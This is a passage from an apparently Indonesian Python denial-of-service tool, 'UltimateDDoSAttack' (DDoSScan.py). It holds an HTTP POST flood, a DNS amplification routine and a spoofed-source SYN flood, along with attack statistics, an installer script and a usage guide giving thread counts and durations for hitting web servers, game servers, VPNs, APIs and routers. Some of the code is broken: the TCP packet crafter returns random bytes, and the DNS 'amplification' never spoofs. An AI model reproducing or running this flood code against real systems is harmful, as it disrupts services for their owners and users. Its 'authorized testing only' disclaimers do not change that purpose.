        print(f"{Colors.CYAN}⏱️  Duration:{Colors.RESET} {Colors.YELLOW}{elapsed:.1f} seconds{Colors.RESET}")
        print(f"{Colors.CYAN}🧵 Threads Used:{Colors.RESET} {Colors.MAGENTA}{self.num_threads}{Colors.RESET}")
        print(f"{Colors.CYAN}📦 Total Packets Sent:{Colors.RESET} {Colors.RED}{packets:,}{Colors.RESET}")
        print(f"{Colors.CYAN}🔗 Successful Connections:{Colors.RESET} {Colors.GREEN}{connections:,}{Colors.RESET}")
        print(f"{Colors.CYAN}⚡ Average Rate:{Colors.RESET} {Colors.WHITE}{packets_per_sec:.1f} packets/second{Colors.RESET}")
        print(f"{Colors.CYAN}📈 Connection Rate:{Colors.RESET} {Colors.CYAN}{connections_per_sec:.1f} connections/second{Colors.RESET}")
        print(f"{Colors.CYAN}✅ Success Rate:{Colors.RESET} {Colors.GREEN}{success_rate:.1f}%{Colors.RESET}")
        
        # Estimate bandwidth used
        estimated_bandwidth = (packets * 1000 * 8) / (elapsed * 1000000)  # Rough estimate in Mbps
        print(f"{Colors.CYAN}🌐 Estimated Bandwidth:{Colors.RESET} {Colors.RED}{estimated_bandwidth:.1f} Mbps{Colors.RESET}")
        
        # Effectiveness rating
        if success_rate > 75:
            rating = f"{Colors.GREEN}★★★★★ EXCELLENT{Colors.RESET}"
        elif success_rate > 50:
            rating = f"{Colors.YELLOW}★★★☆☆ GOOD{Colors.RESET}"
        elif success_rate > 25:
            rating = f"{Colors.MAGENTA}★★☆☆☆ FAIR{Colors.RESET}"
        else:
            rating = f"{Colors.RED}★☆☆☆☆ POOR{Colors.RESET}"
        
        print(f"{Colors.CYAN}⭐ Attack Rating:{Colors.RESET} {rating}")
        
        # Save results to file
        self.save_results(packets, connections, elapsed)
        
        print(f"\n{Colors.GREEN}{'═' * 75}{Colors.RESET}")
        input(f"{Colors.YELLOW}Press Enter to return to main menu...{Colors.RESET}")

    def save_results(self, packets, connections, elapsed):
        """Save results to file"""
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"attack_{self.target_ip.replace('.', '_')}_{timestamp}.json"
            
            results = {
                "timestamp": timestamp,
                "target_ip": self.target_ip,
                "target_port": self.target_port,
                "attack_method": self.attack_method,
                "threads": self.num_threads,
                "duration_seconds": elapsed,
                "total_packets": packets,
                "successful_connections": connections,
                "packets_per_second": packets / elapsed if elapsed > 0 else 0,
                "success_rate": (connections / max(1, packets)) * 100,
                "estimated_bandwidth_mbps": (packets * 1000 * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            }
            
            with open(filename, 'w') as f:
                json.dump(results, f, indent=4)
            
            print(f"{Colors.GREEN}[✓] Results saved to: {filename}{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to save results: {e}{Colors.RESET}")

    # ===================== ADVANCED ATTACK METHODS =====================

    def attack_dns_amplification(self):
        """DNS Amplification Attack (requires DNS server list)"""
        dns_servers = [
            "8.8.8.8",  # Google DNS
            "1.1.1.1",  # Cloudflare
            "9.9.9.9",  # Quad9
        ]
        
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # DNS query for amplification (ANY query for maximum response)
                dns_query = bytearray()
                dns_query += b'\x00\x00'  # Transaction ID
                dns_query += b'\x01\x00'  # Flags: Standard query
                dns_query += b'\x00\x01'  # Questions: 1
                dns_query += b'\x00\x00'  # Answer RRs
                dns_query += b'\x00\x00'  # Authority RRs
                dns_query += b'\x00\x00'  # Additional RRs
                
                # Query for large response (ANY type)
                domain = "google.com"
                for part in domain.split('.'):
                    dns_query += bytes([len(part)])
                    dns_query += part.encode()
                
                dns_query += b'\x00'  # End of domain
                dns_query += b'\x00\xff'  # Type ANY (255)
                dns_query += b'\x00\x01'  # Class IN (1)
                
                dns_server = random.choice(dns_servers)
                
                # Send to target (spoofed from DNS server)
                sock.sendto(dns_query, (self.target_ip, self.target_port))
                
                with self.lock:
                    self.packets_sent += 1
                
                sock.close()
                
            except:
                pass
            
            time.sleep(random.uniform(0.01, 0.05))

    def attack_syn_flood(self):
        """SYN Flood Attack"""
        while self.attack_running:
            try:
                # Raw socket for SYN packets
                raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                
                # Craft TCP SYN packet
                source_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                
                packet = self.craft_tcp_packet(
                    source_ip=source_ip,
                    dest_ip=self.target_ip,
                    source_port=random.randint(1024, 65535),
                    dest_port=self.target_port,
                    flags="S"  # SYN flag
                )
                
                raw_socket.sendto(packet, (self.target_ip, self.target_port))
                
                with self.lock:
                    self.packets_sent += 1
                
                raw_socket.close()
                
            except:
                # Try normal TCP flood if raw socket fails
                self.attack_tcp_flood()
                return
            
            time.sleep(random.uniform(0.001, 0.01))

    def craft_tcp_packet(self, source_ip, dest_ip, source_port, dest_port, flags="S"):
        """Craft TCP packet manually"""
        # Simplified packet crafting
        ip_header = bytearray()
        tcp_header = bytearray()
        
        # Just return dummy packet for demonstration
        # In real implementation, this would craft proper IP/TCP headers
        packet = os.urandom(64)
        return packet

    def attack_post_flood(self):
        """HTTP POST Flood with large payloads"""
        paths = ['/api/v1/data', '/wp-admin/admin-ajax.php', '/submit', '/upload']
        
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                if self.target_port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target_ip)
                
                sock.connect((self.target_ip, self.target_port))
                
                for _ in range(random.randint(5, 20)):
                    if not self.attack_running:
                        break
                    
                    path = random.choice(paths)
                    user_agent = random.choice(self.user_agents)
                    
                    # Generate random payload (1KB - 10KB)
                    payload_size = random.randint(1024, 10240)
                    payload = os.urandom(payload_size)
                    
                    request = f"POST {path} HTTP/1.1\r\n"
                    request += f"Host: {self.target_ip}\r\n"
                    request += f"User-Agent: {user_agent}\r\n"
                    request += "Content-Type: application/x-www-form-urlencoded\r\n"
                    request += f"Content-Length: {payload_size}\r\n"
                    request += "Connection: keep-alive\r\n"
                    request += "\r\n"
                    
                    sock.send(request.encode())
                    sock.send(payload)
                    
                    with self.lock:
                        self.packets_sent += 1
                    
                    time.sleep(random.uniform(0.01, 0.1))
                
                sock.close()
                
                with self.lock:
                    self.successful_connections += 1
                    
            except:
                with self.lock:
                    self.packets_sent += 1
            
            time.sleep(0.05)

# ===================== FORMAT PEMAKAIAN =====================

def show_usage_format():
    """Tampilkan format pemakaian yang lengkap"""
    print(f"""
{Colors.CYAN}{Colors.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════╗
║                         FORMAT PENGGUNAAN                                 ║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.YELLOW}{Colors.BRIGHT}CARA MENJALANKAN:{Colors.RESET}
1. Simpan script sebagai `DDoSScan.py`
2. Berikan permission: `chmod +x DDoSScan.py`
3. Jalankan: `python3 DDoSScan.py` atau `./DDoSScan.py`
{Colors.YELLOW}{Colors.BRIGHT}PERINGATAN & DISCLAIMER:{Colors.RESET}
⚠  {Colors.RED}AUTHOR TIDAK BERTANGGUNG JAWAB JIKA TERJADI SESUATU!{Colors.RESET}
⚠  {Colors.RED}Serangan DDoS ilegal tanpa izin!{Colors.RESET}
⚠  {Colors.RED}Hanya untuk tujuan testing authorized!{Colors.RESET}
⚠  {Colors.RED}DILARANG MEMODIFIKASI/MENGUBAH SCRIPT INI APAPUN ALASANNYA!!{Colors.RESET}

{Colors.YELLOW}{Colors.BRIGHT}STEP-BY-STEP PENGGUNAAN:{Colors.RESET}

{Colors.GREEN}Langkah 1: PILIH MENU{Colors.RESET}
[1] Target Preset - Pilih dari server yang umum
[2] Custom Attack - Atur parameter manual
[3] Quick Calculator - Hitung kebutuhan
[4] Usage Guide - Panduan lengkap
[5] Direct Attack - Langsung attack cepat
[6] Exit - Keluar

{Colors.GREEN}Langkah 2: KONFIGURASI{Colors.RESET}
• Masukkan target IP/hostname
• Tentukan port (default 80 untuk HTTP, 443 untuk HTTPS)
• Pilih metode serangan:
  - TCP Flood: Untuk serangan Layer 4
  - HTTP Flood: Untuk serangan Layer 7
  - UDP Flood: Untuk bandwidth tinggi
  - Slowloris: Untuk exhaust connections
  - Mixed: Kombinasi semua metode

{Colors.GREEN}Langkah 3: SET PARAMETER{Colors.RESET}
• Threads: 100-10000 (semakin banyak semakin kuat)
• Duration: 60-3600 detik (1 menit - 1 jam)
• Method: Pilih berdasarkan target

{Colors.GREEN}Langkah 4: VERIFIKASI{Colors.RESET}
Script akan menampilkan ringkasan konfigurasi
Ketik 'CONFIRM' untuk memulai serangan

{Colors.GREEN}Langkah 5: MONITOR{Colors.RESET}
• Real-time statistics akan ditampilkan
• Progress bar menunjukkan durasi
• Packet rate dan success rate live update

{Colors.YELLOW}{Colors.BRIGHT}CONTOH KASUS PENGGUNAAN:{Colors.RESET}

{Colors.CYAN}Contoh 1: Testing Web Server Sendiri{Colors.RESET}
1. Pilih [2] Custom Attack
2. Target IP: 192.168.1.100 (server lokal Anda)
3. Port: 80
4. Threads: 500
5. Duration: 60
6. Method: HTTP Flood
7. Monitor server resources selama testing

{Colors.CYAN}Contoh 2: Load Testing API{Colors.RESET}
1. Pilih [1] Target Preset → API Server
2. Otomatis konfigurasi untuk API
3. Threads: 1500
4. Duration: 420 detik (7 menit)
5. Method: HTTP POST Flood
6. Pantau response time API

{Colors.CYAN}Contoh 3: Bandwidth Testing{Colors.RESET}
1. Pilih [3] Quick Calculator
2. Masukkan bandwidth Anda: 100 Mbps
3. Script hitung otomatis parameter optimal
4. Gunakan parameter yang direkomendasikan

{Colors.YELLOW}{Colors.BRIGHT}KONFIGURASI OPTIMAL:{Colors.RESET}

┌─────────────────┬─────────────┬────────────┬──────────────┐
│   Target Type   │  Threads    │ Duration   │   Method     │
├─────────────────┼─────────────┼────────────┼──────────────┤
│ Web Server      │ 2000-3000   │ 5-10 min   │ HTTP Flood   │
│ Game Server     │ 5000-8000   │ 3-5 min    │ UDP Flood    │
│ VPN/Proxy       │ 3000-4000   │ 8-12 min   │ Slowloris    │
│ API Server      │ 1500-2500   │ 5-8 min    │ POST Flood   │
│ Router          │ 10000+      │ 3-4 min    │ Mixed        │
└─────────────────┴─────────────┴────────────┴──────────────┘

{Colors.YELLOW}{Colors.BRIGHT}MONITORING & ANALYTICS:{Colors.RESET}
• Hasil serangan disimpan otomatis dalam file JSON
• Bandwidth usage diestimasi
• Success rate dihitung
• Rekomendasi untuk serangan berikutnya

{Colors.YELLOW}{Colors.BRIGHT}TROUBLESHOOTING:{Colors.RESET}
{Colors.RED}Problem:{Colors.RESET} Low success rate
{Colors.GREEN}Solution:{Colors.RESET} Kurangi threads, periksa koneksi, coba metode berbeda

{Colors.RED}Problem:{Colors.RESET} Script error permission denied
{Colors.GREEN}Solution:{Colors.RESET} Jalankan dengan sudo atau sebagai administrator

{Colors.RED}Problem:{Colors.RESET} Target tidak merespon
{Colors.GREEN}Solution:{Colors.RESET} Periksa firewall, pastikan target online, ganti port

{Colors.YELLOW}{Colors.BRIGHT}KATA KUNCI UNTUK TESTING EFEKTIF:{Colors.RESET}
✅ Gunakan VPS dengan bandwidth besar
✅ Mulai dengan threads rendah, naikkan bertahap
✅ Kombinasikan metode serangan
✅ Monitor target response time
✅ Simpan log untuk analisis

{Colors.RED}
═══════════════════════════════════════════════════════════════════════════
⚠  PERINGATAN AKHIR: TANGGUNG JAWAB SEPENUHNYA ADA PADA PENGGUNA!
   Penggunaan ilegal dapat mengakibatkan:
   • Denda hingga miliaran rupiah
   • Hukuman penjara bertahun-tahun
   • Penyitaan perangkat
   • Pencabutan izin internet
═══════════════════════════════════════════════════════════════════════════{Colors.RESET}
    """)
    
    input(f"{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

# ===================== MAIN EXECUTION =====================

def main():
    """Main execution function"""
    try:
        # Check Python version
        if sys.version_info < (3, 6):
            print(f"{Colors.RED}[!] Python 3.6+ required!{Colors.RESET}")
            return
        
        # Check for required modu
        # les
        try:
            import ssl
            import socket
        except ImportError as e:
            print(f"{Colors.RED}[!] Missing required module: {e}{Colors.RESET}")
            return
        
        # Show usage format first
        os.system('clear' if os.name != 'nt' else 'cls')
        show_usage_format()
        
        # Create and run attack tool
        tool = UltimateDDoSAttack()
        tool.main_menu()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Script interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Unexpected error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()

# ===================== INSTALLATION SCRIPT =====================

def create_install_script():
    """Create installation script for easy setup"""
    install_script = """#!/bin/bash
# Installation script for Ultimate DDoS Tester

echo "=========================================="
echo "  Ultimate DDoS Tester - Installation"
echo "=========================================="

# Check Python
if ! command -v python3 &> /dev/null; then
    echo "[-] Python3 not found! Installing..."
    sudo apt-get update
    sudo apt-get install -y python3 python3-pip
fi

# Check pip
if ! command -v pip3 &> /dev/null; then
    echo "[-] pip3 not found! Installing..."
    sudo apt-get install -y python3-pip
fi

# Install requirements
echo "[+] Installing Python requirements..."
pip3 install requests

# Make script executable
chmod +x DDoSScan.py

echo ""
echo "=========================================="
echo "  Installation Complete!"
echo "=========================================="
echo ""
echo "To run the tool:"
echo "  python3 DDoSScan.py"
echo "  or"
echo "  ./DDoSScan.py"
echo ""
echo "DISCLAIMER: Use only for authorized testing!"
echo ""

# Create config directory
mkdir -p ./attack_logs
echo "[+] Created attack_logs directory"
"""

    with open("install.sh", "w") as f:
        f.write(install_script)
    
    print(f"{Colors.GREEN}[+] Installation script created: install.sh{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Run: chmod +x install.sh && ./install.sh{Colors.RESET}")

if __name__ == "__main__":
    # Create installation script
    create_install_script()
    
    # Run main program
    main()
